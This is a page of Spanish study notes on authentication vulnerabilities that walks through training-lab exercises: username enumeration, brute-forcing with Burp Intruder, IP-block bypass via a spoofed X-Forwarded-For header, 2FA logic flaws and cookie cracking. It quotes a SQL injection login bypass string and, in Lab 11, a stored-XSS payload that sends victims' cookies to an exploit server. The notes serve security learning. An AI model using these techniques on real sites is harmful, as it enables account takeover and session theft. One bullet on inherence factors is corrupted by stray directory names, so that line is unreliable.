@@ -1,0 +1,753 @@
+<h2 id="0-índice">0. Índice</h2>
+
+<ul>
+  <li>1 Introducción.</li>
+  <li>2 Concepto de autenticación.
+    <ul>
+      <li>2.1. Factores de autenticación.</li>
+      <li>2.2. Diferencias entre la autenticación y la autorización.</li>
+    </ul>
+  </li>
+  <li>3 Vulnerabilidades de autenticación
+    <ul>
+      <li>3.1. Cómo se plantean las vulnerabilidades de autenticación.</li>
+      <li>3.2. Vulnerabilidades en los mecanismos de autenticación.
+        <ul>
+          <li>3.2.1. Vulnerabilidades en los mecanismos basados en contraseñas.
+            <ul>
+              <li>3.2.1.1. Ataques de fuerza bruta.</li>
+              <li>3.2.1.2. Fallas en la protección contra ataques de fuerza bruta.</li>
+              <li>3.2.1.3. Bloqueos de cuenta.</li>
+            </ul>
+          </li>
+          <li>3.2.2. Vulnerabilidades en autenticacion multifactor.</li>
+          <li>
+            <p>3.2.3. Vulnerabilidades en otros mecanismos de autenticación.</p>
+
+            <p><br /></p>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="1-introducción">1. Introducción.</h3>
+
+<p>Las vulnerabilidades de autenticación pueden suponer uno de los problemas más fáciles de entender y al mismo tiempo uno de los mayores peligros debido a la obvia relación que existe entre autenticación y seguridad.</p>
+
+<p>En esta sección discutiremos los métodos de autenticación más utilizados por sitios webs y las posibles vulnerabilidades que pueden haber con ellos y finalmente hablaremos de cómo hacer estos métodos de autenticación más seguros.</p>
+
+<p><br /></p>
+
+<h3 id="2-concepto-de-autenticación">2. Concepto de autenticación.</h3>
+
+<h4 id="21-definición-y-factores-de-autenticación">2.1. Definición y factores de autenticación.</h4>
+<p>El <strong>proceso de autenticación</strong> es el proceso de verificar la identidad de un cliente que se dispone a utilizar un servicio <em>público</em>, accesible para cualquiera desde internet.</p>
+
+<p>Para desarrollar el proceso de autenticación se tienen en cuenta 3 factores que identifican al cliente:</p>
+
+<ul>
+  <li>
+    <p>Algo que el cliente en particular <strong>sabe</strong>; como una contraseña o una pregunta de seguridad (factores de conocimiento).</p>
+  </li>
+  <li>
+    <p>Algo que el cliente <strong>tiene</strong>; como un dispositivo móvil o un token de seguridad (factores de posesión).</p>
+  </li>
+  <li>
+    <p>Algo que el cliente Apuntes apuntesHechos Desktop Pictures scriptApuntes.sh Templates como rasgos faciales detectables mediante dispositivos de análisis biométricos (factores inherentes).</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="22-diferencias-entre-la-autenticación-y-la-autorización">2.2. Diferencias entre la autenticación y la autorización.</h4>
+
+<p>La diferencia entre la <strong>autenticación</strong> y la <strong>autorización (access control)</strong> es que uno es el proceso de verificación de identidad de un usuario y el otro es el proceso de verificación de permisos de un usuario a la hora de realizar una determinada acción.</p>
+
+<ul>
+  <li>Authentication -&gt; Identidad.</li>
+  <li>Access Control -&gt; Permisos, dependiente de la autenticación y el control de sesiones.</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="3-vulnerabilidades-de-autenticación">3. Vulnerabilidades de autenticación.</h3>
+
+<h4 id="31-cómo-se-plantean-las-vulnerabilidades-de-autenticación">3.1. Cómo se plantean las vulnerabilidades de autenticación.</h4>
+
+<p>En términos muy generales, la mayoría de las vulnerabilidades de autenticación se deben a dos motivos:</p>
+
+<p><br /></p>
+
+<ul>
+  <li>Mecanismos de seguridad débiles frente a ataques de fuerza bruta (probar con un montón de palabras de una lista para comprobar si alguna de ellas es de hecho la contraseña).</li>
+</ul>
+
+<p><br /></p>
+
+<ul>
+  <li>Defectos en el código (como errores lógicos, falta de saneamiento de código) del mecanismo de autenticación que provocan un bypass del mismo por parte del atacante. Un ejemplo sería introducir en un campo de credencial el término <strong>’ OR 1=1 - -</strong>.</li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="32-vulnerabilidades-en-los-mecanismos-de-autenticación">3.2. Vulnerabilidades en los mecanismos de autenticación.</h4>
+
+<p>Distinguimos fundamentalmente entre los siguientes mecanismos de autenticación: <strong>contraseñas, contraseñas y factores de segunda autenticación</strong> y otros tipos de autenticación.</p>
+
+<p><br /></p>
+
+<h5 id="321-vulnerabilidades-en-mecanismos-de-contraseña-proceso-y-defectos">3.2.1. Vulnerabilidades en mecanismos de contraseña. Proceso y defectos.</h5>
+
+<p>En esta sección miraremos más de cerca algunas de las vulnerabilidades más comnues encontradas en mecanismos de logeo por contraseña. También sugeriremos métodos de explotación de dichas vulnerabilidades.</p>
+
+<p>Este mecanismo de autenticación está basado en un procedimiento a través del cual un usuario que se registra en el sitio web recibe tres elementos: un <strong>nombre de usuario</strong>, una <strong>contraseña</strong> y un <strong>email</strong>, ya sea proporcionados por él o por un administrador del sitio web.</p>
+
+<p>En este proceso, el riesgo se encuentra en que un atacante sea capaz de adivinar las credenciales asociadas con la cuenta bien por fuerza bruta o bien por una intercepción de la comunicación. Veámos una serie de ejemplos.</p>
+
+<p><br /></p>
+
+<h6 id="3211-ataques-de-fuerza-bruta">3.2.1.1. Ataques de fuerza bruta</h6>
+
+<p><strong>Concepto de ataque de fuerza bruta</strong></p>
+
+<p>Un <strong>ataque de fuerza bruta</strong> es un procedimiento mediante el cual un atacante lleva a cabo una secuencia de intentos de logeo con la finalidad de terminar utilizando unas credenciales válidas para un usuario en alguno de dichos intentos. Estos ataques generalmente se basan en una lista de palabras que puede ser utilizada o bien como posibles “usernames” o bien como posibles “passwords”.</p>
+
+<p>La lista a su vez puede estar generada al azar o bien su contenido puede estar hecho a través de una fundamentación OSINT lo cual aumenta en gran medida la eficacia de estos ataques. Esto, por ejemplo, permitiría modificar el tipo de nombre de usuario que se utiliza si sabes que la empresa a la que pertenece el sitio web que intentas atacar utiliza nombres de usuario con el formato:</p>
+
+<pre><code class="language-default">firstname.lastname@companyname.com
+</code></pre>
+
+<p>También se puede obtener de esta manera el nombre de la cuenta del adiminstrador (admin, administrator, etc) y demás datos importantes de la infraestructura informática de la empresa.</p>
+
+<p><br /></p>
+
+<p><strong>Fortaleza de una contraseña</strong></p>
+
+<p>Al mismo tiempo las contraseñas también pueden ser víctimas de este tipo de ataques con la inconveniencia de la <strong>fortaleza de la contraseña</strong>. Este concepto alude al número de posibilidades existentes entre las cuales se podría encontrar tu contraseña dentro de un contexto léxico concreto. Si el número es grande, tu contraseña es fuerte y de lo contrario sería débil.</p>
+
+<p>Es decir, si tu contraseña es un número de cuatro cifras del 0 al 9, entonces un atacante que pretenda “crakear” tu contraseña teniendo este conocimiento no tendría que probar, como mucho, mas que con 10000 intentos de logeo, que aunque parezcan muchos no lo son para un programa que realiza ataques de fuerza bruta.</p>
+
+<p>Por otra parte, si tu contraseña consta de 12 caracteres alfanuméricos, el número de intentos se eleva a 33^12 lo cual aumenta demasiado el tiempo de crakeo para cualquier atacante y se consideraría que esa es una contraseña relativamente fuerte.</p>
+
+<p>Sin embargo, hoy en día el concepto de la fortaleza de una contraseña está obsoleto debido a que existen otras formas de conseguir la misma (filtraciones de empresas, bypass de tokens de aplicaciones, etc).</p>
+
+<p><br /></p>
+
+<p><strong>Enumeración de nombres de usuario</strong></p>
+
+<p>La <strong>enumeración</strong> es un término en ciberseguridad que se refiere a un proceso de búsqueda de evidencias o indicios sobre algo en concreto, en este caso, pistas sobre nombres de usuario.</p>
+
+<p>La enumeración de nombres de usuario con frecuencia se basa en los gaps de información proporcionados por la propia aplicación web cuando se interactúa con ella para provocar un error.</p>
+
+<p>Así por ejemplo, un gap de información bastante frecuente consiste en informar al usuario de que a introducido su contraseña de manera incorrecta dando a entender por tanto de que el nombre de usuario es correcto.</p>
+
+<p>También se pueden obtener evidencias desde:</p>
+
+<ul>
+  <li>
+    <p><strong>Códigos de status</strong>: Generalemente, el código de error que proporciona un sitio web es distinto cuando introduces un nombre y una contraseña inválida que cuando introduces un nombre válido.</p>
+  </li>
+  <li>
+    <p><strong>Mensajes de error mal escritos</strong>: Algunas veces, aunque se pretenda mostrar el mismo mensaje introduzcas bien o mal el nombre de usuario existen fallos de programación que muestran un mensaje distinto en función de la situación, por ejemplo; que falte un punto, una tilde, etc.</p>
+  </li>
+  <li>
+    <p><strong>Tiempo de respuesta</strong>: El tiempo de respuesta puede ser mayor en los casos en lso que se introduce un nombre de usuario válido.</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: Username enumeration via differente responses</strong></p>
+
+<p>Este laboratorio nos pide que utilicemos una lista de nombres de usuario y contraseñas para realizar un ataque de fuerza bruta y conseguir unas credenciales válidas.</p>
+
+<p>Se nos da un fichero con nombres y otro con contraseñas. Los descargamos y los empleamos como payloads en el intruder para realizar un ataque de fuerza bruta en la request de logeo. Empleamos el tipo “Cluster Bomb”.</p>
+
+<p>Observamos durante el proceso que existe una respuesta distinta (más pesada) cuando se utiliza el nombre ‘atlanta’, esto puede ser inidico de que se trata del nombre correcto (se trata del cambio asociado al mensjae de error que ha pasado de incorrect username a incorrect password en la respuesta http):</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401113914.png" text-align="center" />
+</div>
+
+<p>Así, iniciamos paralelamente un ataque sólo con el nombre de atlanta y la lista de contraseñas y finalmente terminamos obteniendo las credenciales válidas: atlanta:123qwe</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401114008.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: Username enumeration via subtly differente responses</strong></p>
+
+<p>En este caso, no existe un gap de información intencionado como en el caso anterior, que nos permitía discernir entre cuándo el nombre de usuario o la contraseña eran incorrectos.</p>
+
+<p>Sin embargo, cuando realizamos un ataque de fuerza bruta sólo probando nombres de usuario comprobamos que cuando el nombre es correcto, el mensaje es ligeramente distinto:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401120135.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401120159.png" text-align="center" />
+</div>
+
+<p>Esto lo vemos haciendo con Burp filtre mediante un mesnaje de error. En un de los intentos este mensaje de error no se detecta.</p>
+
+<p>La falta del punto que ocurre con el nombre de usuario ‘atlas’ puede ser indicio de que se trata del nombre de usuario correcto. De esta forma, probamos las contraseñas con ese nombre de usuario y obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401120313.png" text-align="center" />
+</div>
+
+<p>Con lo que las credenciales validas son atlas:robert.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 3: Username enumeration via reponse timing</strong>.</p>
+
+<p>En este caso se tiene un laboratorio que no devuelve mensajes de error sino un time delay.</p>
+
+<p>Además, tiene añadida cierta protección contra ataques de fuerza bruta, de manera que si detecta que la misma IP hace múltiples intentos de logeo se le bloqueará la posibilidad de hacer otra request:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401162926.png" text-align="center" />
+</div>
+
+<p>Para hacer un bypass a este tipo de protección podemos emplear la sigueinte línea <strong>X-Forwarded-For: 203.0.113.8</strong>, para camuflar nuestra IP como si fuera otra. Evidentemente tendremos que ir cambiando el número de la IP falsa para que no nos terminen bloqueándo.</p>
+
+<p>Así, obtenemos que, en primer lugar interceptamos una request, le añadimos la cabecera antes mencionada y se lo pasamos al Intruder en el que setearemos los conjuntos de payloads de la siguiente manera:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401171214.png" text-align="center" />
+</div>
+
+<p>Podemos observar dos detalles:</p>
+
+<ul>
+  <li>Los conjuntos de payloads están sobre el redireccionado de IP y sobre el nombre de usuario</li>
+  <li>La contraseña tiene al menos 100 caracteres para agudizar el delay de la respuesta en el caso de que el nombre de usuario sea acertado.</li>
+</ul>
+
+<p>Sólo queda definir el conjunto de los payloads:</p>
+
+<ul>
+  <li>Para el primer set de payloads, el set del forward de la IP, tenemos:</li>
+</ul>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401171257.png" text-align="center" />
+</div>
+
+<ul>
+  <li>Para el segundo, la lista de nombres de usuario proporcionada por el enunciado.</li>
+</ul>
+
+<p>Seguidamente, una vez iniciado el ataque, añadimos dos registros a la tabla de información: response received y response completed.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401171451.png" text-align="center" />
+</div>
+
+<p>De esta forma podremos comprobar cuánto han tardado las respuestas. Observamos que hay una que ha tardado significativamente más que el resto:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401171910.png" text-align="center" />
+</div>
+
+<p>De esta manera, realizamos un segundo ataque de fuerza bruta con ese nombre y probando la lista de contraseñas que tenemos por el enunciado (con la misma estructura que la anterior respecot del spoof de la IP, reaprovechamos la estructura y cambiamos la posición y el conjunto del segundo set de payloads):</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401172228.png" text-align="center" />
+</div>
+
+<p>Y ahí tenemos las credenciales válidas.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401172313.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h6 id="3212-fallas-en-la-protección-contra-ataques-de-fuerza-bruta">3.2.1.2. Fallas en la protección contra ataques de fuerza bruta.</h6>
+
+<p>Es de sentido común el pensar que cuando un atacante realiza un ataque de fuerza bruta van a haber muchos intentos fallidos antes de que pueda ocurrir algún acierto.</p>
+
+<p>De manera que una forma de protegerse ante un ataque de fuerza bruta es volver lo más complejo posible el proceso de automatización de una petición de logeo.</p>
+
+<p>Las dos formas más comunes de prevenir un ataque de fuerza bruta son:</p>
+
+<ul>
+  <li>Bloquear la cuenta a la que el atacante intenta acceder después de muchos intentos.</li>
+  <li>Bloquear la dirección IP del usuario remoto si hace demasiados intenteos de inicio de sesión en rápida sucesión.</li>
+</ul>
+
+<p>Ambos métodos pueden sortearse mediante el empleo de diversas estrategias como el empleo de la IP spoofing.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: Broken brute-force protection, IP block</strong></p>
+
+<p>El siguiente laboratorio tiene establecido que bloquee temporalmente nuestra IP si fallamos al menos 3 intentos de logeo seguidos.</p>
+
+<p>Para hacer un bypass de este método de protección podemos seguir la siguiente estrategia: Intentamos dos peticiones de logeo y luego nos logeamos con nuestras autenticas credenciales.</p>
+
+<p>De esta forma preparamos una request que interceptamos con el proxy de BurpSuite y se la mandamos al Intruder y llevamos a cabo la siguiente configuración de payloads:</p>
+
+<ul>
+  <li>
+    <p>En primer lugar, seteamos dos conjuntos de payloads en ‘username’ y en ‘password’. Además establecemos el tipo de ataque a ‘Pitchfork’ para que los set de payloads se alternan de manera sincronizada, esto se entenderá más adelante.</p>
+  </li>
+  <li>
+    <p>Seguidamente seteamos los conjuntos de payloads de la siguiente manera:
+Para los username:</p>
+  </li>
+</ul>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401175646.png" text-align="center" />
+</div>
+
+<p>Y para las password:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220401175530.png" text-align="center" />
+</div>
+
+<p>De esta forma, como los payloads se alternan de manera sincronizada cada dos intentos nos logeamos acertadamente con nuestras credenciales y por tanto no nos bloquean.</p>
+
+<p>Las listas se pueden hacer offline para cargarlas posteriormente y utilizar scripts sobre las listas hechas para ahorrar tiempo. En concreto, en este caso he utilizado, para las contraseñas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220402115510.png" text-align="center" />
+</div>
+
+<p>Y para los nombres de usuario:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220402121047.png" text-align="center" />
+</div>
+
+<p>Así, empleamos tales listas para hacer un ataque de fuerza bruta.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220402124913.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220402125014.png" text-align="center" />
+</div>
+
+<p>Y finalmente obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220402125544.png" text-align="center" />
+</div>
+
+<p>Y habríamos resuelto el laboratorio:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220402125618.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h6 id="3213-bloqueo-de-cuenta">3.2.1.3. Bloqueo de cuenta.</h6>
+
+<p>Otro método que utilizan las webs es bloquear una cuenta si ciertos criterios de sospecha se cumplen, por ejemplo, bloquear una cuenta en el momento en el que falla x veces un logeo.</p>
+
+<p>Esto puede servir a un atacante para enumerar nombres de usuario, lleva a cabo un ataque de fuerza bruta y los nombres que resulten bloqueados serán aquellos pertenecientes a una cuenta existente.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: Username enumeration via account lock</strong></p>
+
+<p>Este laboratorio se protege de ataques de fuerza bruta implementando un bloqueo de cuenta cuando se detectan más de 4 intentos de logeos fallidos. Sin embargo, existe una falla y es que aunque se bloeque, si introduces las credenciales correctas sale un mensaje diferente.</p>
+
+<p>Para resolver este laboratorio vamos a hacer una enumeración de nombres de usuario con burpsuite para obtener el nombre de usuario de una cuenta válida y seguidamente vamos a probar todas las contraseñas con ese nombre de usuario hasta obtener una seña de que hemos dado con la contraseña correcta.</p>
+
+<p>En primer lugar, mandamos una petición de logeo a la aplicación web que interceptamos con el proxy de BurpSuite:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406113813.png" text-align="center" />
+</div>
+
+<p>Y la mandamos al Intruder:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406114351.png" text-align="center" />
+</div>
+
+<p>Teniendo en cuenta que rellenamos los payloads de la siguiente manera:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406114826.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406114853.png" text-align="center" />
+</div>
+
+<p>Así, se termina teniendo un mensaje más largo que el resto que es el que indica que se ha intentado logear más veces de la cuenta</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406154645.png" text-align="center" />
+</div>
+
+<p>De esta forma, tomamos el nombre y lo ponemos a probar con todas las contraseñas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406154830.png" text-align="center" />
+</div>
+
+<p>Debido a la falla, habrá una, la correcta, que no tendrá mensaje de error aunque esté bloqueada:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406155414.png" text-align="center" />
+</div>
+
+<p>De esta manera las credenciales son: alerts:ginger</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406155457.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>User rate limiting</strong></p>
+
+<p>Otra forma en que los sitios web intentan evitar los ataques de fuerza bruta es mediante la limitación de la tasa de usuarios.</p>
+
+<p>En este caso, realizar demasiadas solicitudes de inicio de sesión en un corto período de tiempo hace que se bloquee su dirección IP. Por lo general, la IP solo se puede desbloquear de una de las siguientes maneras:</p>
+
+<ul>
+  <li>
+    <p>Automáticamente después de que haya transcurrido un cierto período de tiempo.</p>
+  </li>
+  <li>
+    <p>Manualmente por un administrador.</p>
+  </li>
+  <li>
+    <p>Manualmente por el usuario después de completar con éxito un CAPTCHA</p>
+  </li>
+</ul>
+
+<p>A veces se prefiere la limitación de la tasa de usuarios al bloqueo de cuentas debido a que es menos propenso a la enumeración de nombres de usuario y ataques de denegación de servicio.</p>
+
+<p>Sin embargo, todavía no es completamente seguro. Como vimos en un ejemplo en un laboratorio anterior, hay varias formas en que un atacante puede manipular su IP aparente para evitar el bloqueo.</p>
+
+<p>Como el límite se basa en la tasa de solicitudes HTTP enviadas desde la dirección IP del usuario, a veces también es posible eludir esta defensa si puede averiguar cómo adivinar varias contraseñas con una sola solicitud.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: Broken brute-force protection, multiple credentials per request</strong>.</p>
+
+<p>Este laboratorio es vulnerable debido a una falla lógica en su protección contra ataques de fuerza bruta, para resolver el laboratorio hemos de hacer brute-force a la contraseña del usuario carlos.</p>
+
+<p>Vamos a aprovecharnos de un fallo en la forma en al que se procesa la contraseña del usuario, a través de código JSON dentro del cuerpo de la request:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220426202032.png" text-align="center" />
+</div>
+
+<p>Así, si tnemos una lista de candidatos a contraseñas podemos implementar una matriz JSON con todos los strings</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220426202136.png" text-align="center" />
+</div>
+
+<p>Y al mandar la request con BurpRepeater, obtendremos la siguiente respuesta:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220426202200.png" text-align="center" />
+</div>
+
+<p>Eso significa que el candidato acertado estaba en la lista y ha sido admitido debido a la falla de procesamiento del servidor que no ha sido capaz de filtrar la matriz de la request. Así, abrimos la sesión en el navegador pulsando el botón derecho y seleccionado la opción:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220426202404.png" text-align="center" />
+</div>
+
+<p>Y copiamos la URL teniendo acceso a la sesión.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220426202325.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h5 id="322-vulnerabilidades-en-autenticacion-multifactor">3.2.2. Vulnerabilidades en autenticacion multifactor.</h5>
+
+<p>En esta sección echaremos un vistazo sobre algunas de las vulnerabilidades que pueden ocurrir en mecanismos donde intervienen más de un factor de autenticación.</p>
+
+<p>La autenticación multifactor consiste, en la mayoría de los casos, en añadir un factor más al proceso de autenticación además de las credenciales usuario:contraseña. Generalmente, se tratan de factores o bien conocimiento (como una pregunta) o factores de posesión, (un segundo código que se envía a un dispositivo móvil o al email).</p>
+
+<p>Aunque es completamente cierto que emplear una autenticación en dos pasos es mucho más seguro que emplear una sola autenticación. Sin embargo, este método no vale más de lo que vale la forma en la que está implementando. Una implementación pobre puede dar la posibilidad a un atacante de hacer un bypass de este mecanismo de protección.</p>
+
+<p>Veamos algunos ejemplos:</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 7: 2FA simple bypass</strong></p>
+
+<p>Este laboratorio tiene una protección de la cuentas de usuario mediante un factor de segunda autenticación de tipo posesión (un mensaje al email).</p>
+
+<p>Sin embargo, tiene una falla y es que aunque te rediriga a una página donde hace falta introducir un código de segunda autenticación te logea directamente como usuario sin necesidad de introducir el código.</p>
+
+<p>Así, introducimos las credenciales de la víctima; carlos:montoya y vamos directamente a la página /my_account sin necesidad de introducir el código de autenticación y de esa forma terminariamos el laboratorio.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 8: 2FA Broken Logic</strong></p>
+
+<p>Este laboratorio presenta el mismo caso que el laboratorio anterior con la salvedad de que en este caso la forma en la que la lógica tiene fallas es distinta.</p>
+
+<p>En este caso, el proceso de autenticación no se produce con la verificación de las credenciales si no con al acreditación del código de segunda autenticación cuya propiedad viene descrita mediante el valor de un parámetro en la request de envío.</p>
+
+<p>Es decir, que si nos logeamos con unas credenciales autenticas, por ejemplo; wiener:peter y seguidamente interceptar la request del código de segunda autenticación:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406183828.png" text-align="center" />
+</div>
+
+<p>Podemos observar que existe un parámetro con el valor de nuestro nombre de usuario, ese valor se encarga de acreditar que la cuenta a la que se está accediendo es aquella cuyo nombre de usuario coincida con el valor de dicho parámetro. Así, cambiamos el valor del parámetro al nombre de usuario de la cuenta víctima; carlos y llevamos la request al Intruder.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220406184217.png" text-align="center" />
+</div>
+
+<p>A partir de ahí, realizaríamos un ataque de fuerza bruta de un número de 4 cifras con Burp para crackear el código y logearnos como Carlos.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 9: 2FA bypass using a brute-force attack</strong>.</p>
+
+<p>Este laboratorio contiene un factor de segunda autenticación que es vulnerable al brute-forcing. Aunque tras introducir dos intentos fallidos se te echa de la sesión para prevenir ataques de fuerza bruta</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220427095203.png" text-align="center" />
+</div>
+
+<p>Asi que tenemos que emplear la característica de manejo de sesión de Burp para logearse de vuelta antes de seguir echando requests.</p>
+
+<p><br /></p>
+
+<h5 id="323-vulnerabilidades-en-otras-formas-de-autenticación">3.2.3. Vulnerabilidades en otras formas de autenticación.</h5>
+
+<p>En este apartado vamos a ver algunas fallas que existen en diversas funcionalidades asociadas a los procesos de autenticación menos frecuentes.</p>
+
+<p><br /></p>
+
+<p><strong>Mantener a los usuarios logeados</strong></p>
+
+<p>Una característica bastante común de los sitios web consiste en una opción que mantiene a un usuario logeado incluso sin tener una sesión abierta en el navegador.</p>
+
+<p>Esto generalmente se implementa gracias a un <strong>token</strong> que se almacena a modo de cookie. De esta forma, cuando el sitio identifica dicha cookie, lo relaciona con una sesión que está activa y conecta al usuario con su antigua sesión sin la necesidad de pasar por el proceso de autenticación.</p>
+
+<p>El peligro reside en que muchos sitios webs generan dicha cookie utilizan un patrón predecible, como una combinación entre el nombre de usuario y la contraseña, etc o un cifrado débil.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 10: Brute-Force a stay-logged-in cookie</strong>.</p>
+
+<p>En esta ocasión se nos presenta un laboratorio que te ofrece la oportunidad de mantenerte logeado mediante una cookie “stay-logged-in” que resulta ser la composición cifrada en partes de tu usuario y la contraseña.</p>
+
+<p>Por ejemplo, introduciendo nuestra cookie de la sesión wiener:peter en un decodificador genérico:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220402181201.png" text-align="center" />
+</div>
+
+<p>Ahí se puede ver que dicha cookie es el nombre_de_usuario:pass_cipher_MD5 cifrado a su vez en base 64.</p>
+
+<p>Así, conociendo el nombre de usuario y teniendo una lista de posibles contraseñas hacemos un ataque de fuerza bruta ciñiendo un set de payloads a las cookies.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220402193854.png" text-align="center" />
+</div>
+
+<p>Obteniendo finalmente:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220402193940.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 11: Offline password craking</strong>.</p>
+
+<p>Este laboratorio almacena la contraseña de un usuario cifrada mediante hash en una cookie. Además, tenemos una vulnerabilidad XSS en la funcionalidad de los comentarios</p>
+
+<p>En primer lugar, nos logeamos con nuestras credenciales wiener:peter y seguidamente comprobamos la stay-logged-in cookie y vemos que está codificada en base 64 y que se trata de el nombre:(contraseñacodificadaenMD5) esto puede averiguarse mediante decodify.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220509204058.png" text-align="center" />
+</div>
+
+<p>Por otra parte, observamos que la sección de comentarios es vulnerable a XSS ya que introduciendo un comentario como &lt;h1&gt;hola&lt;/h1&gt; obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220509204602.png" text-align="center" />
+</div>
+
+<p>Así, vamos a aprovechar estas vulnerabilidades para extraer la cookie stay-logged-in del usuario carlos.</p>
+
+<p>Para ello introducimos el siguiente payload en un comentario:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">//your-exploit-server-id.web-security-academy.net/</span><span class="dl">'</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>Y acudimos al log de nuestro servidor del exploit observando:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220509210251.png" text-align="center" />
+</div>
+
+<p>Luego, introducimnos dicha cookie en nuestra cookie de stay-logged-in y entramos dentro del servidor:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220509210427.png" text-align="center" />
+</div>
+
+<p>Aunque, también podríamos haber decodeado la cookie con decodify y tener la contraseña de carlos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220509210554.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Reseteo de la contraseña de un usuario</strong></p>
+
+<p>En muchas aplicaciones web existe una función que permite cambiar la contraseña para todos aquellos usuarios que la hayan perdido entre otras razones.</p>
+
+<p>Existen tres vias diferentes entre las que este mecanismo puede ser dañino:</p>
+
+<ul>
+  <li><strong>Mandar la contraseña por email</strong>: Puede ocurrir que el canal a través del cual se envía el email sea un canal inseguro, exponiendo de esa manera la información ante un ataque de MiTM, o que otra persona tenga acceso al email del usuario con lo que la contraseña también se vería expuesta en ese caso.</li>
+</ul>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Reseteo de la password a través de la URL</strong>: Un método más robusto de resetear contraseñas consiste en enviar una URL única al usuario que le envía a la página de reseteo de la contraseña.</li>
+</ul>
+
+<pre><code class="language-default">http://website.com/reset-password?user=victim-user
